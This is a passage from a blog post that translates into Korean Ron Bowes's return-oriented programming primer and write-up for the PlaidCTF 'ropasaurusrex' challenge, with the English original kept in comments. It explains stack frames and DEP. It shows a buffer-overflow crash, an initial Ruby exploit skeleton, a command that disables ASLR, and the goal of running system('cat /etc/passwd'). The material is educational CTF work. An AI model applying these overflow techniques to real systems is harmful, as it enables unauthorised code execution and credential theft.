---
layout: post
title: "ropasaurusrex: return-oriented programming 입문서"
date: 2014-03-19 20:44:03 +0900
lang: ko
comments: false
description: SkullSecurity의 Ron Bowes가 쓴 return-oriented programming 입문서가 있어 번역했다.
categories:
    - CTF
keywords: pctf, plaidctf, ropasaurusrex, write-up, rop, return-oriented programming
redirect_from: /p/20140319/
external-url: https://blog.skullsecurity.org/2013/ropasaurusrex-a-primer-on-return-oriented-programming
---

[SkullSecurity][]의 [Ron Bowes][]가 쓴 [return-oriented programming 입문서][external-url]가 있어 번역했다.

[SkullSecurity]: https://blog.skullsecurity.org
[Ron Bowes]: https://blog.skullsecurity.org/author/ron
[external-url]: https://blog.skullsecurity.org/2013/ropasaurusrex-a-primer-on-return-oriented-programming

<!-- more -->
---

<!-- # ropasaurusrex: a primer on return-oriented programming -->

<!-- One of the worst feelings when playing a capture-the-flag challenge is the [hindsight][] problem. You spend a few hours on a level---nothing like the amount of time I spent on [cnot][], not by a fraction---and realize that it was actually pretty easy. But also a brainfuck. That's what ROP's all about, after all! -->
CTF 대회에서 문제를 풀다가 [나중에 깨달을 때][hindsight] 가장 기분 나쁘다. 내가 [cnot][]에 쓴 시간에 비할 바는 아니지만, 한 문제에 몇 시간을 보내고 나서 사실은 꽤 쉬운 문제라는 걸 깨닫는다. 게다가 짜증난다. 그게 바로 ROP다!

[hindsight]: http://knowyourmeme.com/memes/captain-hindsight
[cnot]: https://blog.skullsecurity.org/blog/2013/epic-cnot-writeup-plaidctf

<!-- Anyway, even though I spent a lot of time working on the wrong solution (specifically, I didn't think to bypass [ASLR][] for quite awhile), the process we took of completing the level first without, then with ASLR, is actually a good way to show it, so I'll take the same route on this post. -->
어쨌든, 한동안 [ASLR][]을 우회할 생각을 하지 못하는 등 잘못된 방법으로 많은 시간을 썼음에도 불구하고, 우리가 이 문제를 풀기까지 거쳤던 과정은 보여주기 좋은 방식이다. 처음엔 ASLR을 고려하지 않고, 그 다음엔 ASLR을 고려해서 푸는 방식을 설명하도록 하겠다.

[ASLR]: https://en.wikipedia.org/wiki/Address_space_layout_randomization

<!-- Before I say anything else, I have to thank HikingPete for being my wingman on this one. Thanks to him, we solved this puzzle much more quickly and, for a short time, were in 3rd place worldwide! -->
먼저, 파트너가 되어 준 HikingPete에게 감사하고 싶다. 그 덕분에 우리는 이 퍼즐을 훨씬 빨리 풀 수 있었고, 잠시 세계 3위를 차지했다!

<!-- Coincidentally, I've been meaning to write a post on [ROP][] for some time now. I even wrote a vulnerable demo program that I was going to base this on! But, since PlaidCTF gave us this challenge, I thought I'd talk about it instead! This isn't just a writeup, this is designed to be a fairly in-depth primer on return-oriented programming! If you're more interested in the process of solving a CTF level, have a look at [my writeup of cnot][]. :) -->
우연히도 난 [ROP][]에 대한 글을 쓸 셈이었다. 심지어 설명에 사용할 취약한(vulnerable) 데모 프로그램까지 만들고 있었다! 하지만 PlaidCTF에서 문제가 나왔으니 그것 대신 이 문제에 대해 설명하겠다! 이건 단순한 문제 풀이(writeup)가 아니고, 상당히 상세한 return-oriented programming 입문서가 될 것이다! 만약 CTF 문제를 푸는 과정이 더 궁금하다면, [내 cnot writeup][my writeup of cnot]을 보면 될 것이다. :)

[ROP]: https://en.wikipedia.org/wiki/Return-oriented_programming
[my writeup of cnot]: https://blog.skullsecurity.org/blog/2013/epic-cnot-writeup-plaidctf

<!-- ## What the heck is ROP? -->

## <a id="what-the-heck-is-rop"></a>도대체 ROP가 뭐야?

<!-- ROP---return-oriented programming---is a modern name for a classic exploit called "[return into libc][]". The idea is that you found an overflow or other type of vulnerability in a program that lets you take control, but you have no reliable way get your code into executable memory ([DEP][], or data execution prevention, means that you can't run code from anywhere you want anymore). -->
ROP(return-oriented programming)는 고전적 익스플로잇(exploit) "[return into libc][]"를 나타내는 현대 용어다. 이 아이디어는 프로그램을 마음대로 조종할 수 있는 오버플로(overflow)나 다른 유형의 취약점을 발견했지만, 임의의 코드를 실행 가능한 메모리 영역(executable memory)에 올릴 수 있는 확실한 방법이 없을 때([DEP][], 데이터 실행 방지(Data Execution Prevention), 사용자가 원하는 곳에서부터 코드를 실행시킬 수 없다.)를 위한 것이다.

[return into libc]: https://en.wikipedia.org/wiki/Return-to-libc_attack
[DEP]: https://en.wikipedia.org/wiki/Data_Execution_Prevention

<!-- With ROP, you can pick and choose pieces of code that are already in sections executable memory and followed by a '[return][]'. Sometimes those pieces are simple, and sometimes they're complicated. In this exercise, we only need the simple stuff, thankfully! -->
ROP를 이용하면 실행 가능한 메모리 영역(executable memory)에 있는 코드 중 '[return][]'으로 끝나는 조각들을 고를 수 있다. 그 조각들이 간단할 때도 있고, 복잡할 때도 있다. 다행히도 이 예제에서 우리는 간단한 것만 있으면 된다!

[return]: https://en.wikipedia.org/wiki/Return_statement

<!-- But, we're getting ahead of ourselves. Let's first learn a little more about the [stack][]! I'm not going to spend a ton of time explaining the stack, so if this is unclear, please check out [my assembly tutorial][]. -->
하지만 우린 너무 앞서나가고 있다. 일단 [스택(stack)][stack]에 대해 좀 더 배워보자! 스택을 설명하는 데에 _엄청난_ 시간을 쓰지는 않을 것이니, 잘 모르겠다면 [내 어셈블리(assembly) 튜토리얼][my assembly tutorial][^1]을 보면 될 것이다.

[stack]: https://en.wikipedia.org/wiki/Call_stack
[my assembly tutorial]: https://blog.skullsecurity.org/wiki/index.php/The_Stack
[^1]: 링크가 [바뀌었다](https://wiki.skullsecurity.org/Assembly).

<!-- ## The stack -->

## <a id="the-stack"></a>스택

<!-- I'm sure you've heard of the stack before. [Stack overflows][]? Smashing the stack? But what's it actually mean? If you already know, feel free to treat this as a quick primer, or to just skip right to the next section. Up to you! -->
스택에 관해 한 번쯤은 들어보았을 것이다. [스택 오버플로(stack overflow)][Stack overflows]? 스택 깨뜨리기(smashing the stack)? 하지만 그게 무엇을 의미하는 걸까? 이미 알고 있다면, 이걸 간단한 입문서의 느낌으로 보든지, 바로 다음 섹션으로 넘어가라. 당신 마음대로!

[Stack overflows]: https://en.wikipedia.org/wiki/Stack_overflow

<!-- The simple idea is, let's say function `A()` calls function `B()` with two parameters, 1 and 2. Then `B()` calls `C()` with two parameters, 3 and 4. When you're in `C()`, the stack looks like this: -->
아이디어를 간단하게 설명하자면, 함수 `A()`가 함수 `B()`를 두 개의 인자 1, 2와 함께 호출한다고 하자. 그리고 `B()`는 `C()`를 두 개의 인자 3, 4와 함께 호출한다고 하자. `C()`가 실행 중일 때, 스택은 이렇게 보일 것이다.

<!-- 
+----------------------+
|         ...          | (higher addresses)
+----------------------+

+----------------------+ <-- start of 'A's stack frame
|   [return address]   | <-- address of whatever called 'A'
+----------------------+
|   [frame pointer]    |
+----------------------+
|   [local variables]  |
+----------------------+

+----------------------+ <-- start of 'B's stack frame
|         2 (parameter)|
+----------------------+
|         1 (parameter)|
+----------------------+
|   [return address]   | <-- the address that 'B' returns to
+----------------------+
|   [frame pointer]    |
+----------------------+
|   [local variables]  |
+----------------------+

+----------------------+ <-- start of 'C's stack frame
|         4 (parameter)|
+----------------------+
|         3 (parameter)|
+----------------------+
|   [return address]   | <-- the address that 'C' returns to
+----------------------+

+----------------------+
|         ...          | (lower addresses)
+----------------------+
 -->
``` text
+----------------------+
|         ...          | (높은 주소)
+----------------------+

+----------------------+ <-- 'A'의 스택 프레임 시작
|   [return address]   | <-- 'A'를 호출한 주소
+----------------------+
|   [frame pointer]    |
+----------------------+
|   [local variables]  |
+----------------------+

+----------------------+ <-- 'B'의 스택 프레임 시작
|         2 (parameter)|
+----------------------+
|         1 (parameter)|
+----------------------+
|   [return address]   | <-- 'B'가 반환되는 주소
+----------------------+
|   [frame pointer]    |
+----------------------+
|   [local variables]  |
+----------------------+

+----------------------+ <-- 'C'의 스택 프레임 시작
|         4 (parameter)|
+----------------------+
|         3 (parameter)|
+----------------------+
|   [return address]   | <-- 'C'가 반환되는 주소
+----------------------+

+----------------------+
|         ...          | (낮은 주소)
+----------------------+
```

<!-- This is quite a mouthful (eyeful?) if you don't live and breathe all the time at this depth, so let me explain a bit. Every time you call a function, a new "stack frame" is built. A "frame" is simply some memory that the function allocates for itself on the stack. In fact, it doesn't even allocate it, it just adds stuff to the end and updates the `esp` register so any functions it calls know where its own stack frame needs to start (`esp`, the stack pointer, is basically a variable). -->
당신이 이 정도 수준에 매우 익숙한 사람이 아니라면 이건 꽤 어려운 (눈을 끄는?) 것이기 때문에 조금 설명하도록 하겠다. 매번 당신이 함수를 호출할 때, 새로운 "스택 프레임"이 만들어진다. "프레임"은 단순히 말해 함수가 자신을 위해 스택에 할당한 메모리다. 사실은 할당조차 하지 않으며, 그저 끝에 뭔가 추가하고 `esp` 레지스터를 업데이트 한다. 그러면 이것이 호출하는 모든 함수는 자신의 스택 프레임이 어디에서 시작해야 하는지 알게 된다(`esp`, 스택 포인터이며 이는 기본적으로 변수다).

<!-- This stack frame holds the context for the current function, and lets you easily a) build frames for new functions being called, and b) return to previous frames (i.e., return from functions). `esp` (the stack pointer) moves up and down, but always points to the top of the stack (the lowest address). -->
이 스택 프레임은 현재 함수의 상태(context)를 담고 있고, 당신이 쉽게 a) 새로 불린 함수의 프레임을 만들고, b) 이전 프레임으로 돌아갈 수 있게 한다 (예를 들어, 함수에서 반환한 경우). `esp`(스택 포인터)는 위아래로 움직이지만 항상 스택의 시작점(가장 낮은 주소)을 가리킨다.

<!-- Have you ever wondered where a function's local variables go when you call another function (or, better yet, you call the same function again recursively)? Of course not! But if you did, now you'd know: they wind up in an old stack frame that we return to later! -->
다른 함수를 호출했을 때나 같은 함수를 재귀적으로 한 번 더 호출할 때 원래 함수의 지역 변수들은 어디로 가는지 의문을 가져본 적 있는가? 당연히 없을 것이다! 하지만 생각해 봤다면, 이미 알고 있을 것이다. 지역 변수는 우리가 다시 돌아올 예전 스택 프레임에 머무른다!

<!-- Now, let's look at what's stored on the stack, in the order it gets pushed (note that, confusingly, you can draw a stack either way; in this document, the stack grows from top to bottom, so the older/callers are on top and the newer/callees are on the bottom): -->
이제 스택에 무엇이 저장되어 있는지 스택에 들어간 순서대로 보도록 하자. 헷갈리지만, 스택을 다른 방법으로 그릴 수도 있다. 이 글에서는 스택이 위에서 아래로 늘어나기에 오래된/호출하는 함수는 위에, 새로운/호출된 함수는 아래에 있다.

<!-- - Parameters: The parameters that were passed into the function by the caller---these are _extremely_ important with ROP.
- Return address: Every function needs to know where to go when it's done. When you call a function, the address of the instruction right after the call is pushed onto the stack prior to entering the new function. When you return, the address is popped off the stack and is jumped to. This is extremely important with ROP.
- Saved frame pointer: Let's totally ignore this. Seriously. It's just something that compilers typically do, except when they don't, and we won't speak of it again.
- Local variables: A function can allocate as much memory as it needs (within reason) to store local variables. They go here. They don't matter at all for ROP and can be safely ignored. -->
- 인자(Parameters): 호출한 함수가 넘긴 인자들. ROP에서 _대단히_ 중요하다.
- 반환 주소(Return address): 모든 함수는 자신이 끝나면 어디로 가야 하는지 알아야 한다. 당신이 함수를 호출하면, 그 함수에 진입하기 앞서 호출 직후의 명령어(instruction) 주소가 스택에 들어간다. 반환하는 순간, 그 주소를 스택에서 뽑고, 그리로 점프한다. 이건 ROP에서 대단히 중요하다.
- 프레임 포인터(Saved frame pointer): 이건 완전히 무시하자. 정말로. 이건 예외는 있지만 컴파일러가 일반적으로 하는 일이고, 이에 대해 다시 언급하지는 않을 것이다.
- 지역 변수(Local variables): 함수는 지역 변수를 저장하기 위해 필요한 만큼 (적당한 범위 내에서) 메모리를 할당할 수 있다. 지역 변수는 여기서 시작한다. ROP와는 전혀 관계 없으며 무시해도 안전하다.

<!-- So, to summarize: when a function is called, parameters are pushed onto the stack, followed by the return address. When the function returns, it grabs the return address off the stack and jumps to it. The parameters pushed onto the stack are [removed by the calling function][], [except when they're not][]. We're going to assume the caller cleans up, that is, the function doesn't clean up after itself, since that's is how it works in this challenge (and most of the time on Linux). -->
그래서 요약하자면, 함수가 호출되면 인자들이 스택에 들어가고, 그 뒤에 반환 주소가 들어간다. 함수가 반환하면, 반환 주소를 스택에서 뽑아 그리로 점프한다. 스택에 들어갔던 인자들은 [호출하는 함수에 의해 지워지지만][removed by the calling function], [예외][except when they're not]도 있다. 우리는 호출하는 함수가 인자를 지운다고 가정하자. 즉, 호출된 함수가 자신의 인자를 지우지 않는다고 가정하자. 이건 이 문제가 (그리고 Linux 대부분의 역사에서) 그렇게 동작하기 때문이다.

[removed by the calling function]: https://en.wikipedia.org/wiki/X86_calling_conventions#cdecl
[except when they're not]: https://en.wikipedia.org/wiki/X86_calling_conventions#stdcall

<!-- ## Heaven, hell, and stack frames -->

## <a id="heaven-hell-and-stack-frames"></a>천국, 지옥 그리고 스택 프레임

<!-- The main thing you have to understand to know ROP is this: a function's entire universe is its stack frame. The stack is its god, the parameters are its commandments, local variables are its sins, the saved frame pointer is its bible, and the return address is its heaven (okay, probably hell). It's all right there in the [Book of Inte][], chapter 3, verses 19 - 26 (note: it isn't actually, don't bother looking). -->
ROP를 이해하기 위해 이해해야 하는 가장 중요한 건, 함수의 스택 프레임은 그 함수의 온 우주라는 것이다. 스택은 함수의 신이고, 인자는 성경의 십계명이고, 지역 변수는 죄며, 프레임 포인터는 성경이고 반환 주소는 천국이다(그래, 지옥일 수도 있다). 모든 건 [인텔의 책][Book of Intel], 3장, 19-26구절에 있다(주: 사실 아니니 보는 수고는 할 필요 없다).

[Book of Intel]: http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html

<!-- Let's say you call the `sleep()` function, and get to the first line; its stack frame is going to look like this: -->
당신이 `sleep()` 함수를 호출하고, 첫 번째 줄에 왔다고 하자. 그 스택 프레임은 이렇게 생겼을 것이다.

<!-- 
          ...            <-- don't know, don't care territory (higher addresses)
+----------------------+
|      [seconds]       |
+----------------------+
|   [return address]   | <-- esp points here
+----------------------+
          ...            <-- not allocated, don't care territory (lower addresses)
 -->
``` text
          ...            <-- 모른다, 영역은 상관 없다. (높은 주소)
+----------------------+
|      [seconds]       |
+----------------------+
|   [return address]   | <-- esp는 여기를 가리킨다.
+----------------------+
          ...            <-- 할당되지 않았다, 영역은 상관 없다. (낮은 주소)
```

<!-- When `sleep()` starts, this stack frame is all it sees. It can save a frame pointer (crap, I mentioned it twice since I promised not to; I swear I won't mention it again) and make room for local variables by subtracting the number of bytes it wants from `esp` (ie, making `esp` point to a lower address). It can call other functions, which create new frames under `esp`. It can do many different things; what matters is that, when it `sleep()` starts, the stack frame makes up its entire world. -->
`sleep()`이 시작하는 순간, 스택 프레임은 지금 보이는 게 다다. 이 스택 프레임은 프레임 포인터를 저장할 수도 있고(젠장, 말 안 하기로 해 놓고 두 번이나 말해버렸다. 다시는 언급하지 않을 것을 맹세한다) `esp`에서 몇 바이트 뺌으로써(즉, `esp` 포인터를 더 낮은 주소로 만듦으로써) 지역 변수를 위한 공간을 확보할 수도 있다. `esp` 아래에 새 프레임을 만드는 다른 함수를 호출할 수도 있다. 이 스택 프레임은 여러 가지 다양한 일을 할 수 있다. 그게 무엇인지 간에, `sleep()`이 시작하면, 스택 프레임은 이 함수의 세계를 만들어낸다.

<!-- When `sleep()` returns, it winds up looking like this: -->
`sleep()`이 반환하면, 결국 이렇게 생겼을 것이다.

<!-- 
          ...            <-- don't know, don't care territory (higher addresses)
+----------------------+
|      [seconds]       | <-- esp points here
+----------------------+
| [old return address] | <-- not allocated, don't care territory starts here now
+----------------------+
          ...            (lower addresses)
 -->
``` text
          ...            <-- 모른다, 영역은 상관 없다. (높은 주소)
+----------------------+
|      [seconds]       | <-- esp는 여기를 가리킨다.
+----------------------+
| [old return address] | <-- 할당되지 않았다, 영역은 상관 없다. 이제 여기부터 시작한다.
+----------------------+
          ...            (낮은 주소)
```

<!-- And, of course, the caller, after `sleep()` returns, will remove "seconds" from the stack by adding 4 to `esp` (later on, we'll talk about how we have to use `pop/pop/ret` constructs to do the same thing). -->
당연히 호출한 함수는 `sleep()`이 반환하고 나면 `esp`에 4를 더해 "seconds"를 스택에서 지운다(나중에 똑같은 일을 하기 위해 어떻게 `pop/pop/ret`을 사용해야 하는지 이야기할 것이다).

<!-- In a properly working system, this is how life works. That's a safe assumption. The "seconds" value would only be on the stack if it was pushed, and the return address is going to point to the place it was called from. Duh. How else would it get there? -->
제대로 동작하는 시스템에서는, 이게 작동 원리다. 안전한 전제다. "seconds" 값은 스택에 들어갔을 때 스택에만 있을 것이고, 반환 주소는 호출된 장소를 가리키고 있을 것이다. 그럼, 그럼. 달리 어떤 방법으로 그리 갈 수 있을까?

<!-- ## Controlling the stack -->

## <a id="controlling-the-stack"></a>스택 주무르기

<!-- ...well, since you asked, let me tell you. We've all heard of a "stack overflow", which involves overwriting a variable on the stack. What's that mean? Well, let's say we have a frame that looks like this: -->
...뭐, 당신이 궁금해 하니 말하겠다. 우리 모두 "스택 오버플로"에 대해 들어봤다. 그건 스택에 있는 변수를 덮어쓰는 것과 관련이 있다. 그게 무슨 뜻이냐? 뭐, 이런 스택 프레임이 있다고 하자.

<!-- 
          ...            <-- don't know, don't care territory (higher addresses)
+----------------------+
|      [seconds]       |
+----------------------+
|   [return address]   | <-- esp points here
+----------------------+
|     char buf[16]     |
|                      |
|                      |
|                      |
+----------------------+
          ...            (lower addresses)
 -->
``` text
          ...            <-- 모른다, 영역은 상관 없다. (높은 주소)
+----------------------+
|      [seconds]       |
+----------------------+
|   [return address]   | <-- esp는 여기를 가리킨다.
+----------------------+
|     char buf[16]     |
|                      |
|                      |
|                      |
+----------------------+
          ...            (낮은 주소)
```

<!-- The variable `buf` is 16 bytes long. What happens if a program tries to write to the 17^th byte of buf (i.e., `buf[16]`)? Well, it writes to the last byte---[little endian][]---of the return address. The 18^th byte writes to the second-last byte of the return address, and so on. Therefore, we can change the return address to point to anywhere we want. _Anywhere_ we want. So when the function returns, where's it go? Well, it thinks it's going to where it's supposed to go---in a perfect world, it would be---but nope! In this case, it's going to wherever the attacker wants it to. If the attacker says to jump to [0][], it jumps to 0 and crashes. If the attacker says to go to `0x41414141` ("AAAA"), it jumps there and probably crashes. If the attacker says to jump to the stack... well, that's where it gets more complicated... -->
변수 `buf`의 길이는 16바이트다. 만약 프로그램이 buf의 17번째 바이트(즉, `buf[16]`)에 쓰려고 하면 어떻게 될까? 에, 반환 주소의 마지막 바이트([리틀 엔디언][little endian])에 쓰게 된다. 18번째 바이트는 반환 주소의 끝에서 두 번째 바이트에 쓰게 되고, 그런 방식이다. 이렇게 우리는 우리가 원하는 곳으로 반환 주소를 바꿀 수 있다. _원하는 곳 어디든_. 함수가 반환하면, 어디로 가겠는가? 뭐, 아마 그건 가야 할 곳으로 가고 있다고 생각할 것이다. 완벽한 세계에서는, 그럴 것이다. 하지만 실은 아니다! 이 경우에는, 공격자가 원하는 곳 어디로든지 갈 수 있다. 공격자가 [0][]으로 점프하라고 하면, 0으로 점프하고 크래시를 일으킬 것이다. 공격자가 `0x41414141`("AAAA")로 점프하라고 하면, 그리로 점프하고 아마도 크래시를 일으킬 것이다. 공격자가 스택으로 점프하라고 하면... 음, 이건 좀 복잡해진다...

[little endian]: https://en.wikipedia.org/wiki/Endianness
[0]: https://en.wikipedia.org/wiki/Zero_page

<!-- ## DEP -->

## <a id="dep"></a>DEP

<!-- Traditionally, an attacker would change the return address to point to the stack, since the attacker already has the ability to put code on the stack (after all, code is just a bunch of bytes!). But, being that it was such a common and easy way to exploit systems, those assholes at OS companies (just kidding, I love you guys :) ) put a stop to it by introducing data execution prevention, or DEP. On any DEP-enabled system, you can no longer run code on the stack---or, more generally, anywhere an attacker can write---instead, it crashes. -->
전통적으로, 공격자는 스택에 코드를 넣을 수 있었기 때문에(어찌 되었건, 코드는 그저 바이트 뭉치일 뿐이다!), 반환 주소가 스택을 가리키도록 바꿔 왔다. 하지만 그건 시스템을 공격하는 일반적이고 쉬운 방법이었기 때문에, OS 회사의 나쁜 자식들이(농담이다, 난 당신들을 사랑한다 :)) 데이터 실행 방지, DEP를 통해 이를 멈췄다. DEP가 적용된 어떤 시스템이건, 스택에서, 좀 더 일반적으로는 공격자가 쓸(write) 수 있는 어떤 곳에서도 코드를 실행할 수 없다. 그렇지 않으면, 크래시를 일으킨다.

<!-- So how the hell do I run code without being allowed to run code!? -->
그러면 코드를 실행할 권한도 없이 도대체 어떻게 코드를 실행할 수 있나!?

<!-- Well, we're going to get to that. But first, let's look at the vulnerability that the challenge uses! -->
음, 이제 그걸 할 것이다. 하지만 먼저, 이 문제가 사용하는 취약점을 보자!

<!-- ## The vulnerability -->

## <a id="the-vulnerability"></a>취약점

<!-- Here's the vulnerable function, fresh from IDA: -->
여기 IDA에서 막 뽑아낸 취약한 함수다.

```
.text:080483F4vulnerable_function proc near
.text:080483F4
.text:080483F4buf             = byte ptr -88h
.text:080483F4
.text:080483F4         push    ebp
.text:080483F5         mov     ebp, esp
.text:080483F7         sub     esp, 98h
.text:080483FD         mov     dword ptr [esp+8], 100h ; nbytes
.text:08048405         lea     eax, [ebp+buf]
.text:0804840B         mov     [esp+4], eax    ; buf
.text:0804840F         mov     dword ptr [esp], 0 ; fd
.text:08048416         call    _read
.text:0804841B         leave
.text:0804841C         retn
.text:0804841Cvulnerable_function endp
```

<!-- Now, if you don't know assembly, this might look daunting. But, in fact, it's simple. Here's the equivalent C: -->
어셈블리를 모른다면, 좀 벅차보일 것이다. 하지만 사실 간단하다. 같은 함수의 C 코드다:

``` c
ssize_t __cdecl vulnerable_function()
{
  char buf[136];
  return read(0, buf, 256);
}
```

<!-- So, it reads 256 bytes into a 136-byte buffer. Goodbye Mr. Stack! -->
256바이트를 읽어 136바이트 버퍼에 넣는다. 즐거웠어요 스택 씨!

<!-- You can easily validate that by running it, piping in a bunch of 'A's, and seeing what happens: -->
이걸 실행함으로써 쉽게 확인할 수 있다. 'A' 뭉치를 파이프로 넣고, 어떻게 되는지 보자.

``` sh
ron@debian-x86 ~ $ ulimit -c unlimited
ron@debian-x86 ~ $ perl -e "print 'A'x300" | ./ropasaurusrex
Segmentation fault (core dumped)
ron@debian-x86 ~ $ gdb ./ropasaurusrex core
[...]
Program terminated with signal 11, Segmentation fault.
#0  0x41414141 in ?? ()
(gdb)
```

<!-- Simply speaking, it means that we overwrote the return address with the letter A 4 times (`0x41414141` = "AAAA"). -->
간단히 말해서, 이건 우리가 반환 주소를 글자 A 4개(`0x41414141`="AAAA")로 덮어썼다는 말이다.

<!-- Now, there are good ways and bad ways to figure out exactly what you control. I used a bad way. I put "BBBB" at the end of my buffer and simply removed 'A's until it crashed at `0x42424242` ("BBBB"): -->
이제, 정확히 뭘 조종하고 있는 건지 알아내기 위한 좋은 방법이 있고 나쁜 방법이 있다. 나는 나쁜 방법을 썼다. 내 버퍼 끝에 "BBBB"를 넣고 `0x42424242`("BBBB")에서 크래시를 일으킬 때까지 'A'를 지웠다.

``` sh
ron@debian-x86 ~ $ perl -e "print 'A'x140;print 'BBBB'" | ./ropasaurusrex
Segmentation fault (core dumped)
ron@debian-x86 ~ $ gdb ./ropasaurusrex core
#0  0x42424242 in ?? ()
```

<!-- If you want to do this "better" (by which I mean, slower), check out Metasploit's [pattern_create.rb][] and [pattern_offset.rb][]. They're great when guessing is a slow process, but for the purpose of this challenge it was so quick to guess and check that I didn't bother. -->
이걸 좀 더 "잘"(내 뜻은, 더 천천히) 하고 싶으면, Metasploit의 [pattern_create.rb][]와 [pattern_offset.rb][]를 보라. 이건 추측이 오래 걸리는 작업일 때 굉장히 좋지만, 이 문제의 경우에는 추측과 확인이 빨라 나는 쓰지 않았다.

[pattern_create.rb]: https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_create.rb
[pattern_offset.rb]: https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb

<!-- ## Starting to write an exploit -->

## <a id="starting-to-write-an-exploit"></a>익스플로잇 제작 시작하기

<!-- The first thing you should do is start running `ropasaurusrex` as a network service. The folks who wrote the CTF used [xinetd][] to do this, but we're going to use [netcat][], which is just as good (for our purposes): -->
가장 먼저 해야 할 일은 `ropasaurusrex`를 네트워크 서비스로 실행시키는 것이다. CTF 주최자들은 [xinetd][]를 썼지만, 우리는 우리의 목적에 알맞은 [netcat][]을 쓸 것이다.

[xinetd]: https://en.wikipedia.org/wiki/Xinetd
[netcat]: https://en.wikipedia.org/wiki/Netcat

``` sh
$ while true; do nc -vv -l -p 4444 -e ./ropasaurusrex; done
listening on [any] 4444 ...
```

<!-- From now on, we can use `localhost:4444` as the target for our exploit and test if it'll work against the actual server. -->
이제부터 우리는 `localhost:4444`를 익스플로잇 대상으로 쓸 수도 있고 실제 서버에도 작용하는지 테스트 할 수도 있다.

<!-- You may also want to disable ASLR if you're following along: -->
ASLR을 끄고 싶다면,

``` sh
$ sudo sysctl -w kernel.randomize_va_space=0
```

<!-- Note that this will make your system easier to exploit, so I don't recommend doing this outside of a lab environment! -->
이건 당신의 시스템을 익스플로잇 당하기 쉽게 만든다는 것을 알아둬라. 그러니 이걸 실험실 환경 바깥에서 하는 건 추천하지 않는다!

<!-- Here's some ruby code for the initial exploit: -->
초반 익스플로잇을 위한 루비 코드다.

``` ruby
$ cat ./sploit.rb
require 'socket'

s = TCPSocket.new("localhost", 4444)

# Generate the payload
payload = "A"*140 +
  [
    0x42424242,
  ].pack("I*") # Convert a series of 'ints' to a string

s.write(payload)
s.close()
```

<!-- Run that with `ruby ./sploit.rb` and you should see the service crash: -->
`ruby ./sploit.rb`를 통해 실행시키면 서비스 크래시를 볼 것이다.

``` sh
connect to [127.0.0.1] from debian-x86.skullseclabs.org [127.0.0.1] 53451
Segmentation fault (core dumped)
```

<!-- And you can verify, using gdb, that it crashed at the right location: -->
그리고 gdb를 통해 이게 알맞은 위치에서 크래시를 일으킨다는 걸 확인할 수 있다.

``` sh
gdb --quiet ./ropasaurusrex core
[...]
Program terminated with signal 11, Segmentation fault.
#0  0x42424242 in ?? ()
```

<!-- We now have the beginning of an exploit! -->
이게 익스플로잇의 시작이다!

<!-- ## How to waste time with ASLR -->

## <a id="how-to-waste-time-with-aslr"></a>어떻게 ASLR로 시간을 낭비하는가

<!-- I called this section 'wasting time', because I didn't realize---at the time---that ASLR was enabled. However, assuming no ASLR actually makes this a much more instructive puzzle. So for now, let's not worry about ASLR---in fact, let's not even _define_ ASLR. That'll come up in the next section. -->
이 섹션을 '시간 낭비'라고 하는 이유는, 내가 ASLR이 적용되어 있다는 것을 그때 깨닫지 못했기 때문이다. 하지만 ASLR이 적용되어 있지 않다고 가정하는 것은 이 문제를 훨씬 교육하기 좋은 퍼즐로 만들어준다. 그러니 지금은 ASLR에 대해 걱정하지 말자. 실제로, ASLR을 _정의조차_ 하지 말자. 다음 섹션에 나올 것이다.

<!-- Okay, so what do we want to do? We have a vulnerable process, and we have the [libc][] shared library. What's the next step? -->
좋다, 이제 우린 뭘 하고 싶은가? 우린 취약한 프로세스를 가지고 있고, [libc][] 공유 라이브러리도 있다. 다음 단계는 뭔가?

[libc]: https://en.wikipedia.org/wiki/C_standard_library

<!-- Well, our ultimate goal is to run system commands. Because [stdin and stdout][] are both hooked up to the [socket][], if we could run, for example, `system("cat /etc/passwd")`, we'd be set! Once we do that, we can run any command. But doing that involves two things: -->
음, 궁극적인 목표는 시스템 명령어를 실행하는 것이다. [stdin과 stdout][stdin and stdout]이 모두 [소켓][socket]에 연결되어 있으므로, 예를 들어 우리가 `system("cat /etc/passwd")`를 실행할 수 있다면, 끝난 거다! 이걸 할 수 있으면, 우린 어떤 명령어든 실행할 수 있다. 하지만 그건 두 가지 조건을 포함한다.

[stdin and stdout]: https://en.wikipedia.org/wiki/Standard_streams
[socket]: https://en.wikipedia.org/wiki/Network_socket

<!-- 1. Getting the string `cat /etc/passwd` into memory somewhere
2. Running the `system()` function -->
1. `cat /etc/passwd` 문자열을 메모리 어딘가에 넣기
2. `system()` 함수 실행하기

<!-- ### Getting the string into memory -->

### <a id="getting-the-string-into-memory"></a>메모리에 문자열 넣기

<!-- Getting the string into memory actually involves two sub-steps: -->
메모리에 문자열을 넣는 건 실제로 두 소단계를 포함한다.

<!-- 1. Find some memory that we can write to
2. Find a function that can write to it -->
1. 우리가 쓸 수 있는 메모리를 찾기
2. 그 메모리에 쓸 수 있는 함수 찾기

<!-- Tall order? Not really! First things first, let's find some memory that we can read and write! The most obvious place is the [.data][] section: -->
무리한 요구라고? 그렇지 않다! 중요한 것부터 하자. 우리가 읽고 쓸 수 있는 메모리를 찾아보자! 가장 명백한 곳은 [.data][] 섹션이다:

[.data]: https://en.wikipedia.org/wiki/Data_segment

``` sh
ron@debian-x86 ~ $ objdump -x ropasaurusrex  | grep -A1 '\.data'
 23 .data         00000008  08049620  08049620  00000620  2**2
                   CONTENTS, ALLOC, LOAD, DATA

```

<!-- Uh oh, .data is only 8 bytes long. That's not enough! In theory, any address that's long enough, writable, and not used will be enough for what we need. Looking at the output for `objdump -x`, I see a section called .dynamic that seems to fit the bill: -->
오 이런, .data는 8바이트밖에 되지 않는다. 이건 부족하다! 이론적으로, 충분히 길고, 쓸 수 있으며(writable), 사용되지 않은 주소는 우리 목적에 충분하다. `objdump -x`의 출력에서, 나는 딱 알맞아 보이는 .dynamic 섹션을 발견했다.

``` sh

 20 .dynamic      000000d0  08049530  08049530  00000530  2**2
                   CONTENTS, ALLOC, LOAD, DATA
```

<!-- The .dynamic section holds information for dynamic linking. We don't need that for what we're going to do, so let's choose address `0x08049530` to overwrite. -->
.dynamic 섹션은 동적 링크 정보를 담고 있다. 우리가 하려는 것에 그건 필요 없으니 주소 `0x08049530`을 덮어쓰기로 하자.

<!-- The next step is to find a function that can write our command string to address `0x08049530`. The most convenient functions to use are the ones that are in the executable itself, rather than a library, since the functions in the executable won't change from system to system. Let's look at what we have: -->
